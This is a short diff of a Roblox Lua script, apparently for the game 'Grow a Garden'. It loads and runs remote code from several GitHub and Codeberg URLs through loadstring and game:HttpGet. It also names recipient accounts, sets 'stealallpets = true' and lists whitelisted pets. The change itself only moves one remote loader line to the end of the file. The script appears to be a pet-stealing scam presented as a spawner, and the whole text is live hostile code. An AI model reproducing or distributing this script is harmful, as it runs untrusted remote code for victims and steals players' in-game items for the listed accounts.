@@ -1,6 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
-loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 
 users = {
     "ajandaa12alt1",
@@ -13,3 +12,5 @@ stealallpets = true
 Whitelist_Pets = {"Red Fox", "Raccoon", "Dragonfly"}
 
 loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/gag"))()
+
+loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
